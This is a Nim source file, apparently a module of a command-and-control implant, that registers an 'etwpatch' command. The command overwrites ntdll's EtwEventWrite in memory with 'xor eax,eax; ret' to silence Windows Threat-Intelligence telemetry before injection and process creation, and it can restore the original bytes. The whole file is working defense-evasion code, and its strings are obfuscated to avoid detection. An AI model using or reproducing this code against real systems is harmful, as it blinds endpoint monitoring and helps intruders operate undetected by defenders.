## etwpatch — patch/unpatch EtwEventWrite in the current process (Windows only).
## Patching silences ETW Microsoft-Windows-Threat-Intelligence telemetry before
## noisy operations (injection, process creation, memory allocation).
## Use 'unpatch' to restore original bytes and re-enable telemetry.
import std/[json, strutils]
import core/types
import commands/registry
import crypto/strenc

when defined(windows):
  type
    HANDLE = int
    DWORD  = uint32
    LPVOID = pointer
    SIZE_T = uint
    BOOL   = int32

  const PAGE_EXECUTE_READWRITE = DWORD(0x40)

  proc GetModuleHandleA(lpModuleName: cstring): HANDLE
    {.importc: "GetModuleHandleA", dynlib: "kernel32".}
  proc GetProcAddress(hModule: HANDLE, lpProcName: cstring): LPVOID
    {.importc: "GetProcAddress", dynlib: "kernel32".}
  proc VirtualProtect(lpAddress: LPVOID, dwSize: SIZE_T,
                      flNewProtect: DWORD, lpflOldProtect: ptr DWORD): BOOL
    {.importc: "VirtualProtect", dynlib: "kernel32".}

  var etwOrigBytes: array[3, byte]
  var etwPatched   = false
  var etwAddr: LPVOID = nil

  proc patchEtw(): string =
    if etwPatched: return hidstr("EtwEventWrite already patched")
    let h = GetModuleHandleA(hidstr("ntdll.dll").cstring)
    if h == 0: return hidstr("Error: ntdll.dll not found")
    let p = cast[ptr array[3, byte]](GetProcAddress(h, hidstr("EtwEventWrite").cstring))
    if p == nil: return hidstr("Error: EtwEventWrite not found")
    etwAddr = cast[LPVOID](p)
    etwOrigBytes = p[]
    var old: DWORD
    if VirtualProtect(etwAddr, SIZE_T(3), PAGE_EXECUTE_READWRITE, addr old) == 0:
      return hidstr("Error: VirtualProtect failed")
    p[][0] = 0x33'u8   # xor eax,eax
    p[][1] = 0xC0'u8
    p[][2] = 0xC3'u8   # ret
    discard VirtualProtect(etwAddr, SIZE_T(3), old, addr old)
    etwPatched = true
    return hidstr("EtwEventWrite patched (xor eax,eax; ret) — ETW MWTI silenced")

  proc unpatchEtw(): string =
    if not etwPatched or etwAddr == nil:
      return hidstr("EtwEventWrite not patched")
    let p = cast[ptr array[3, byte]](etwAddr)
    var old: DWORD
    if VirtualProtect(etwAddr, SIZE_T(3), PAGE_EXECUTE_READWRITE, addr old) == 0:
      return hidstr("Error: VirtualProtect failed")
    p[] = etwOrigBytes
    discard VirtualProtect(etwAddr, SIZE_T(3), old, addr old)
    etwPatched = false
    return hidstr("EtwEventWrite restored — ETW telemetry re-enabled")

proc etwpatchExecute(taskId: string, params: JsonNode, state: AgentState,
                     send: SendMsg): TaskResult =
  when not defined(windows):
    return TaskResult(output: hidstr("etwpatch is Windows-only"),
                      status: "error", completed: true)
  else:
    let action = params{"action"}.getStr("patch")
    let msg = if action == "unpatch": unpatchEtw() else: patchEtw()
    return TaskResult(
      output:    msg,
      status:    if msg.startsWith("Error"): "error" else: "success",
      completed: true,
    )

proc initEtwpatch*() =
  register(hidstr("etwpatch"), etwpatchExecute)
